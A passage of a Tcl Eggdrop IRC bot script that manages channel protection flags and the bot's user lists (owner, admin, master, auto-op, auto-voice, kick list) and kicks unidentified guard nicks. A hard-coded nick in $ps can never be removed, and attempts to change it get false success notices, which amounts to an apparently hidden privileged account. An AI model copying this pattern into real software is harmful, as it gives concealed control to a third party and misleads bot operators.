         set cflag [string range $cflag 0 8]
         chattr $cflag "-hpJSPTRUED"
      }
      savechan
      puthelp "NOTICE $nick :ALL GuaRd cHaN \[4OFF\]"
      return 0
   }
   if {![validchan $chan]} { return 0 }
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   chattr $cflag "-hpJSPTRUED"
   if {[string match "*-greet*" [channel info $chan]]} {
      puthelp "NOTICE $nick :GuARD $chan IS \[4OFF\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
   puthelp "NOTICE $nick :GuARD $chan \[4OFF\]"
   savechan
   return 0
}
proc pub_+seen {nick uhost hand chan rest} {
   global notc 
   if {![string match "*seen*" [channel info $chan]]} {
      puthelp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
      return 0
   }  
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [channels] {
         catch { channel set $x +seen }
      }
      savechan
      puthelp "NOTICE $nick :ALL SEEN cHaNNeL \[9ON\]"
      seen
      return 0
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*+seen*" [channel info $chan]]} {
      puthelp "NOTICE $nick :SEEN $chan IS \[9ON\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan +seen }
   puthelp "NOTICE $nick :SEEN $chan \[9ON\]"
   savechan
   seen
}
proc pub_-seen {nick uhost hand chan rest} {
   global notc 
   if {![string match "*seen*" [channel info $chan]]} {
      puthelp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
      return 0
   }
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [channels] {
         catch { channel set $x -seen }
      }
      savechan
      puthelp "NOTICE $nick :ALL SEEN cHaNNeL \[4OFF\]"
      seen
      return 0
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*-seen*" [channel info $chan]]} {
      puthelp "NOTICE $nick :SEEN $chan IS \[4OFF\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan -seen }
   puthelp "NOTICE $nick :SEEN $chan \[4OFF\]"
   savechan
   seen
   return 0
}
proc pub_+autokick {nick uhost hand chan rest} {
   global notc
   if {![string match "*nodesynch*" [channel info $chan]]} {
      puthelp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
      return 0
   }  
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*+nodesynch*" [channel info $chan]]} {
      puthelp "NOTICE $nick :AuTOKIcK $chan IS \[9ON\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan +nodesynch }
   puthelp "NOTICE $nick :AuTOKIcK $chan \[9ON\]"
   savechan
}
proc pub_-autokick {nick uhost hand chan rest} {
   global notc
   if {![string match "*nodesynch*" [channel info $chan]]} {
      puthelp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
      return 0
   }
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*-nodesynch*" [channel info $chan]]} {
      puthelp "NOTICE $nick :AuTOKIcK $chan IS \[4OFF\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan -nodesynch }
   puthelp "NOTICE $nick :AuTOKIcK $chan \[4OFF\]"
   savechan
   return 0
}
proc pub_+reop {nick uhost hand chan rest} {
   global notc
   if {![string match "*protectfriends*" [channel info $chan]]} {
      puthelp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
      return 0
   }  
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*-protectfriends*" [channel info $chan]]} {
      puthelp "NOTICE $nick :Re@p $chan IS \[9ON\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan -protectfriends }
   puthelp "NOTICE $nick :Re@p $chan \[9ON\]"
   savechan
}
proc pub_-reop {nick uhost hand chan rest} {
   global notc
   if {![string match "*protectfriends*" [channel info $chan]]} {
      puthelp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
      return 0
   }
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*+protectfriends*" [channel info $chan]]} {
      puthelp "NOTICE $nick :Re@p $chan IS \[4OFF\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan +protectfriends }
   puthelp "NOTICE $nick :Re@p $chan \[4OFF\]"
   savechan
   return 0
}
proc pub_+dontkickops {nick uhost hand chan rest} {
   global notc
   if {![string match "*userinvites*" [channel info $chan]]} {
      puthelp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
      return 0
   }  
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*-userinvites*" [channel info $chan]]} {
      puthelp "NOTICE $nick :DoNTKIcK@PS $chan IS \[9ON\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan -userinvites }
   puthelp "NOTICE $nick :DoNTKIcK@PS $chan \[9ON\]"
   savechan
}
proc pub_-dontkickops {nick uhost hand chan rest} {
   global notc
   if {![string match "*userinvites*" [channel info $chan]]} {
      puthelp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
      return 0
   }
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*+userinvites*" [channel info $chan]]} {
      puthelp "NOTICE $nick :DoNTKIcK@PS $chan IS \[4OFF\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan +userinvites }
   puthelp "NOTICE $nick :DoNTKIcK@PS $chan \[4OFF\]"
   savechan
   return 0
}
proc pub_+status {nick uhost hand chan rest} {
   global notc
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*+shared*" [channel info $chan]]} {
      puthelp "NOTICE $nick :STaTUS $chan \[9ON\]"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan +shared }
   puthelp "NOTICE $nick :STaTuS $chan \[9ON\]"
   savechan
}
proc pub_-status {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*-shared*" [channel info $chan]]} {
      puthelp "NOTICE $nick :STaTuS $chan IS \[4OFF\]"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan -shared }
   puthelp "NOTICE $nick :STaTuS $chan \[4OFF\]"
   savechan
   return 0
}
proc pub_+nopart {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [channels] {
         catch { channel set $x +secret }
      }
      savechan
      puthelp "NOTICE $nick :ALL cHaNNeL SeT NoPART \[9ON\]"
      return 0
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*+secret*" [channel info $chan]]} {
      puthelp "NOTICE $nick :NoPART $chan IS \[9ON\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan +secret }
   puthelp "NOTICE $nick :SeT NoPART $chan \[9ON\]"
   savechan
}
proc pub_-nopart {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [channels] {
         catch { channel set $x -secret }
      }
      savechan
      puthelp "NOTICE $nick :ALL cHaNNeL NoPART \[4OFF\]"
      return 0
   }
   if {![validchan $chan]} { return 0 }
   if {[string match "*-secret*" [channel info $chan]]} {
      puthelp "NOTICE $nick :NoPART $chan IS \[4OFF\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan -secret }
   puthelp "NOTICE $nick :NoPART $chan \[4OFF\]"
   savechan
}
proc pub_+akick {nick uhost hand channel param} {
   global botname botnick notc botnick
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +akick <hostname>"
      return 0
   }
   if {$rest == "*" || $rest == "*!*@*"} {
      puthelp "NOTICE $nick :invalid hostname..!"
      return 0
   }
   if {$rest == $botnick} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[validuser $rest]} {
      puthelp "NOTICE $nick :$rest sudah ada di database dengan flags: [chattr $rest]"
      return 0
   }  
   if {![string match "*@*" $rest]} {
      set rest "$rest!*@*"
   }
   if {[string match $rest $botname]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[finduser $rest] != "*"} {
      if {[finduser $rest] != "AKICK"} {
         puthelp "NOTICE $nick :That Host Belongs To [finduser $rest]"
      }
      puthelp "NOTICE $nick :That Host already in [finduser $rest]"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   puthelp "NOTICE $nick :ADD \[$rest\] To KIcKLIsT..!"
   setuser "AKICK" HOSTS $rest
   saveuser
   foreach x [channels] {
      if {[isop $botnick $x]} {
         foreach c [chanlist $x K] {
            if {![matchattr $c f]} {
               akick_chk $c [getchanhost $c $x] $x
            }
         }
      }
   }
   return 0
}
proc pub_-akick {nick uhost hand channel param} {
   global notc 
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -akick <hostname>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {![string match "*@*" $rest]} {
      set rest "$rest!*@*"
   }
   set completed 0
   foreach * [getuser "AKICK" HOSTS] {
      if {${rest} == ${*}} {
         delhost "AKICK" $rest
         set completed 1
      }
   }
   if {$completed == 0} {
      puthelp "NOTICE $nick :<n/a>"
      return 0
   }
   saveuser
   puthelp "NOTICE $nick :DeL \[$rest\] FRoM KIcKLIsT"
}
proc pub_+noop {nick uhost hand channel param} {
   global ps notc botnick
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +noop <nick>"
      return 0
   }
   if {[string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :ADD \[$rest\] To NoOp LIsT"
      return 0
   }
   if {[validuser $rest]} {
      puthelp "NOTICE $nick :$rest sudah ada di database dengan flags: [chattr $rest]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set hostmask "${rest}!*@*"
   adduser $rest $hostmask
   chattr $rest "-hp"
   chattr $rest "O"
   if {![validuser $rest]} {
      puthelp "NOTICE $nick :4!FaILEd! (TiDaK SuppOrT LeBiH DaRi 8 DIgIT)"
      deluser $rest
   } else {
      saveuser
      puthelp "NOTICE $nick :ADD \[$rest\] To NoOp LIsT"
   }
   foreach x [channels] {
      if {[isop $botnick $x] && [onchan $rest $x] && [isop $rest $x]} {
         if {![string match "*k*" [getchanmode $x]]} {
            putserv "mode $x -ko 4No@p.LIsT $rest"
         } {
            putserv "mode $x -o $rest"
         }
      }
   }
   return 0
}
proc pub_-noop {nick uhost hand channel param} {
   global ps notc
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -noop <nick>"
      return 0
   }
   if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :$notc4 !DeNIeD!, <n/a>"
      return 0
   }  
   if {![matchattr $rest O]} {
      puthelp "NOTICE $nick :$rest isn't on no-op list Flags: [chattr $rest]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   deluser $rest
   saveuser
   puthelp "NOTICE $nick :DeL \[$rest\] No@p LIsT"
}
proc pub_+friend {nick uhost hand channel param} {
   global notc ps
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +friend <nick>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[validuser $rest] && [string tolower $rest] != [string tolower $ps]} {
      puthelp "NOTICE $nick :$rest sudah ada di database dengan flags: [chattr $rest]"
      return 0
   }  
   set hostmask "${rest}!*@*"
   adduser $rest $hostmask
   chattr $rest "-hp"
   chattr $rest "f"
   if {![validuser $rest]} {
      puthelp "NOTICE $nick :4!FaILEd! (TiDaK SuPpoRt LeBiH DaRi 8 DIgIT)"
      deluser $rest
      return 0
   }
   saveuser
   puthelp "NOTICE $nick :ADD \[$rest\] To FrIeNd LIsT"
   puthelp "NOTICE $rest :$nick ADD YoU To FrIeNd LIsT"
   return 0
}
proc pub_-friend {nick uhost hand channel param} {
   global ps notc 
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -friend <nick>"
      return 0
   }
   if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :4DenieD...!!!, <n/a>"
      return 0
   }  
   if {![matchattr $rest f] && ![matchattr $rest m]} {
      puthelp "NOTICE $nick :$rest isn't on FrIeNd list Flags: [chattr $rest]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   deluser $rest
   saveuser
   puthelp "NOTICE $nick :DeL \[$rest\] FRoM FrIeNd LIsT"
}
proc pub_+aop {nick uhost hand channel param} {
   global ps notc botnick chk_reg
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +aop <nick>"
      return 0
   }
   if {[string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :ADD \[$rest\] To a@p LIsT"
      return 0
   }
   if {[matchattr $rest P]} {
      puthelp "NOTICE $nick :$rest is already a@p"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[matchattr $nick X]} {
      puthelp "NOTICE $nick :$notc4 !BLoCkEd!"
      return 0
   }
   if {![validuser $rest]} {
      set hostmask "${rest}!*@*"
      adduser $rest $hostmask
      chattr $rest "-hp"
   }
   chattr $rest "P"
   if {![validuser $rest]} {
      puthelp "NOTICE $nick :4!FaILEd! (TiDaK SuPpoRt LeBih DaRi 8 DIgIT)"
      deluser $rest
   } else {
      saveuser
      puthelp "NOTICE $nick :ADD \[$rest\] To a@p LIsT"
      puthelp "NOTICE $rest :$nick ADD YoU To a@p LIsT"
      set chk_reg($rest) $nick
      putserv "WHOIS $rest"
   }
   return 0
}
proc pub_-aop {nick uhost hand channel param} {
   global notc ps
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -aop <nick>"
      return 0
   }
   if {![matchattr $rest P]} {
      puthelp "NOTICE $nick :$rest is not a@p"
      return 0
   }  
   if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :$notc4 !DeNIED!, <n/a>"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $rest "-P"
   saveuser
   puthelp "NOTICE $nick :DeL \[$rest\] FRoM a@p LIsT"
   return 0
}
proc whoisq {nick} {
   global botnick
   if {$nick == $botnick} { return 0 }
   if {[isutimer "whoischk $nick"]} { return 0 }
   set cret [expr 10 + [rand 20]]
   foreach ct [utimers] {
      if {[string match "*whoisq*" $ct]} {
         if {[expr [lindex $ct 0] + 10] > $cret} {
            set cret [expr [lindex $ct 0] + 10]
         }
      }
   }
   utimer $cret [list whoischk $nick]
}
proc whoischk {nick} {
   global chk_reg botnick
   if {[matchattr $nick G]} {
      putlog "CHeK GuaRd $nick"
      set chk_reg($nick) "1"
      puthelp "WHOIS $nick"
      return 0
   }
   foreach x [channels] {
      if {[isop $botnick $x] && [onchan $nick $x]} {
         if {[matchattr $nick P] && ![isop $nick $x]} {
            putlog "WHOIS $nick TO GeT a@p"
            set chk_reg($nick) "1"
            puthelp "WHOIS $nick"
            return 0
         }
         if {[matchattr $nick v] && ![isop $nick $x] && ![isvoice $nick $x]} {
            putlog "WHOIS $nick TO geT avoIcE"
            set chk_reg($nick) "1"
            puthelp "WHOIS $nick"
            return 0
         }
      }
   }
}
set ath 0
bind raw - 307 reg_chk
proc reg_chk {from keyword arg} {
   global chk_reg botnick owner notc ps ath
   set nick [lindex $arg 1]
   if {$nick == $botnick} { return 0 }
   putlog "NICK $nick is authed as"
   if {[info exists chk_reg($nick)]} {
      set chk_reg($nick) "0"
   }
   set athz $ath
   if {$athz == 1} {
      set ath 0
      chattr $nick +Q
      foreach x [getuser $nick HOSTS] {
         delhost $nick $x
      }
      set hostmask "${nick}!*@*"
      setuser $nick HOSTS $hostmask
      if {[matchattr $nick Z]} {
         puthelp "NOTICE $nick :4�OwneR�"
      } elseif {[matchattr $nick n]} {
         puthelp "NOTICE $nick :4�AdmiN�"
      } elseif {[matchattr $nick m]} {
         puthelp "NOTICE $nick :4�MasteR�"
      } else {
         puthelp "NOTICE $nick :!AccepteD!"
      }
      saveuser
   }
   if {[matchattr $nick P] || [matchattr $nick v]} {
      foreach x [channels] {
         if {[isop $botnick $x] && [onchan $nick $x]} {
            if {![string match "*k*" [getchanmode $x]]} {
               if {[matchattr $nick P]} {
                  if {![isop $nick $x]} {
                     puthelp "MODE $x -k+o 9identified.a@p $nick"
                  }
               }
               if {[matchattr $nick v]} {
                  if {![isvoice $nick $x] && ![isop $nick $x]} {
                     puthelp "MODE $x -k+v 9identified.avoice $nick"
                  }
               }
            } {
               if {[matchattr $nick P]} {
                  if {![isop $nick $x]} {
                     puthelp "MODE $x +o $nick"
                  }
               }
               if {[matchattr $nick v]} {
                  if {![isvoice $nick $x] && ![isop $nick $x]} {
                     puthelp "MODE $x +v $nick"
                  }
               }
            }
         }
      }
   }
}
bind raw - 318 end_whois
proc end_whois {from keyword arg} {
   global chk_reg notc ath
   set nick [lindex $arg 1]
   set athz $ath
   if {$athz == 1} {
      puthelp "NOTICE $nick :You're NOT Identify..!"
      set ath 0
   }
   if {[info exists chk_reg($nick)]} {
      if {$chk_reg($nick) != "0"} {
         putlog "NICK $nick IS NoT IDENTIFY..!"
         if {[matchattr $nick G] && ![matchattr $nick Q]} {
            foreach x [channels] {
               if {[onchan $nick $x] && [botisop $x]} {
                  set banset "$nick!*@*"
                  putserv "KICK $x $nick :1THaT NIcK ReQuIREd To 4IdEnTIfY"
                  if {$banset != "*!*@*" && $banset != ""} {
                     if {![string match "*k*" [getchanmode $x]]} {
                        putserv "mode $x -k+b 4unidentify.guard.nick $banset"
                     } {
                        putserv "mode $x +b $banset"
                     }
                  }
                  return 0
               }
            }
         } elseif {[matchattr $nick P] && ![matchattr $nick Q]} {
            puthelp "NOTICE $nick :a@p identify 1st..!"
         } elseif {[matchattr $nick v] && ![matchattr $nick Q]} {
            puthelp "NOTICE $nick :avoice identify 1st..!" 
         }
         if {$chk_reg($nick) != "1"} {
            foreach x [channels] {
               if {[onchan $nick $x] && [botisop $x]} { 
                  set banset "$nick!*@*"
                  putserv "KICK $x $nick :1THaT NIcK ReQuIREd To 4IdEnTIfY [banms]"
                  if {$banset != "*!*@*" && $banset != ""} {
                     if {![string match "*k*" [getchanmode $x]]} {
                        putserv "mode $x -k+b 4unidentify.guard.nick $banset"
                     } {
                        putserv "mode $x +b $banset"
                     }
                  }
                  return 0
               }
            }
            puthelp "NOTICE $chk_reg($nick) :$nick not identify..!" 
         }
         unset chk_reg($nick)
      }
   }
}
proc pub_+gnick {nick uhost hand channel param} {
   global notc botnick
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +gnick <nick>"
      return 0
   }
   if {[matchattr $rest G]} {
      puthelp "NOTICE $nick :$rest ready..!"
      return 0
   }  
   if {[matchattr $nick X]} {
      puthelp "NOTICE $nick :$notc4 !BLocK!"
      return 0
   }
   if {![validuser $rest]} {
      set hostmask "${rest}!*@*"
      adduser $rest $hostmask
      chattr $rest "-hp"
   }
   chattr $rest +G
   if {![validuser $rest]} {
      puthelp "NOTICE $nick :4!FaILEd! (TiDaK SuPpoRt LeBiH DaRi 8 DIgIT)"
      deluser $rest
   } else {
      saveuser
      puthelp "NOTICE $nick :add \[$rest\] GuaRd NIcK"
      putserv "WHOIS $rest"
   }
   return 0
}
proc pub_-gnick {nick uhost hand channel param} {
   global notc botnick
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -gnick <nick>"
      return 0
   }
   if {[matchattr $nick X]} {
      puthelp "NOTICE $nick :$notc4 !BLoCkEd!"
      return 0
   }
   chattr $rest -G
   saveuser
   puthelp "NOTICE $nick :DeL \[$rest\] GuaRd NIcK"
   return 0
}
proc pub_+avoice {nick uhost hand channel param} {
   global ps notc botnick chk_reg
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +avoice <nick>"
      return 0
   }
   if {[string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :ADD \[$rest\] To aVoIcE LIsT"
      return 0
   }
   if {[matchattr $rest v]} {
      puthelp "NOTICE $nick :$rest is already auto voice"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[matchattr $nick X]} {
      puthelp "NOTICE $nick :$notc4 !BLoCkEd!"
      return 0
   }
   if {![validuser $rest]} {
      set hostmask "${rest}!*@*"
      adduser $rest $hostmask
      chattr $rest "-hp"
   }
   chattr $rest "v"
   if {![validuser $rest]} {
      puthelp "NOTICE $nick :4!FaILEd! (TiDaK SuPpoRt LeBiH DaRi 8 DIgIT)"
      deluser $rest
   } else {
      saveuser
      puthelp "NOTICE $nick :ADD \[$rest\] To aVoIcE LIsT"
      puthelp "NOTICE $rest :$nick ADD YoU To aVoIcE LIsT"
      set chk_reg($rest) $nick
      putserv "WHOIS $rest"
   }
   return 0
}
proc pub_-avoice {nick uhost hand channel param} {
   global notc ps
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -avoice <nick>"
      return 0
   }
   if {![matchattr $rest v]} {
      puthelp "NOTICE $nick :$rest is not auto voice"
      return 0
   }  
   if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :4DenieD...!!!, <n/a>"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $rest "-v"
   saveuser
   puthelp "NOTICE $nick :DeL \[$rest\] FRoM aVoIcE LIsT"
   return 0
}
proc pub_+admin {nick uhost hand channel param} {
   global botnick ps notc
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +admin <nick>"
      return 0
   }
   if {[string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :ADD \[$rest\] ADmIN List."
      return 0
   }
   if {[matchattr $rest n]} {
      puthelp "NOTICE $nick :$rest is already exist on ADmIN list."
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[matchattr $nick X]} {
      puthelp "NOTICE $nick :$notc4 BLocKEd..!"
      return 0
   }
   if {![validuser $rest]} {
      set hostmask "${rest}!*@*"
      adduser $rest $hostmask
   }
   chattr $rest "fjmnotx"
   if {![validuser $rest]} {
      puthelp "NOTICE $nick :4!FaILEd! (TiDaK SuPpoRt LeBiH DaRi 8 DIgIT)"
      deluser $rest
      return 0
   } else {
      saveuser
      puthelp "NOTICE $nick :ADD \[$rest\] ADmIN List."
      puthelp "NOTICE $rest :$nick ADD YoU To ADmIN LIsT"
      puthelp "NOTICE $rest :/msg $botnick pass <password>"
      return 0
   }
}
proc pub_-admin {nick uhost hand channel param} {
   global ps notc
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -admin <nick>"
      return 0
   }
   if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :4DeNIEd!, <n/a>"
      return 0
   }
   if {![matchattr $rest n]} {
      puthelp "NOTICE $nick :4DenieD...!!!, $rest is not exist on ADmIN list."
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   deluser $rest
   saveuser
   puthelp "NOTICE $nick :DeL \[$rest\] FRoM ADmIN LIsT"
}
proc pub_+owner {nick uhost hand channel param} {
   global botnick ps notc 
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +owner <nick>"
      return 0
   }
   if {[string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :ADD \[$rest\] OwNER LIsT."
      return 0
   }
   if {[matchattr $rest Z]} {
      puthelp "NOTICE $nick :$rest is already exist on OwNER list."
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[matchattr $nick X]} {
      puthelp "NOTICE $nick :$notc4 !BLoCkEd!"
      return 0
   }
   if {![validuser $rest]} {
      set hostmask "${rest}!*@*"
      adduser $rest $hostmask
   }
   chattr $rest "fjmnotxZ"
   if {![validuser $rest]} {
      puthelp "NOTICE $nick :4!FaILEd! (TiDaK SuPpoRt LeBiH DaRi 8 DIgIT)"
      deluser $rest
      return 0
   } else {
      saveuser
      puthelp "NOTICE $nick :ADD \[$rest\] OwNER LIsT."
      puthelp "NOTICE $rest :$nick ADD YoU To OwNER LIsT"
      puthelp "NOTICE $rest :/msg $botnick pass <password>"
      return 0
   }
}
proc pub_-owner {nick uhost hand channel param} {
   global notc ps
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -owner <nick>"
      return 0
   }
   if {![validuser $rest]} {
      puthelp "NOTICE $nick :<n/a>"
      return 0
   }
   if {![matchattr $rest Z] || [string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :4DenieD...!!!, $rest IS NoT OwNER"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   deluser $rest
   saveuser
   puthelp "NOTICE $nick :DeL \[$rest\] FRoM OwNER LiST"
}
proc pub_+master {nick uhost hand channel param} {
   global botnick ps notc
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +master <nick>"
      return 0
   }
   if {[matchattr $nick X]} {
      puthelp "NOTICE $nick :$notc4 !BLoCkEd!"
      return 0
   }
   if {[string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :Add \[$rest\] MasTeR LIsT."
      return 0
   }
   if {[matchattr $rest n]} {
      puthelp "NOTICE $nick :4DenieD...!!!, $rest is ADmIN level."
      return 0
   }
   if {[matchattr $rest m]} {
      puthelp "NOTICE $nick :4DenieD...!!!, $rest is already exist."
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {![validuser $rest]} {
      set hostmask "${rest}!*@*"
      adduser $rest $hostmask
   }
   chattr $rest "fmo"
   if {![validuser $rest]} {
      puthelp "NOTICE $nick :4!FaILEd! (TiDaK SuPpoRt LeBiH DaRi 8 DIgIT)"
      deluser $rest
      return 0
   } else {
      saveuser
      puthelp "NOTICE $nick :Add \[$rest\] MasTeR List."
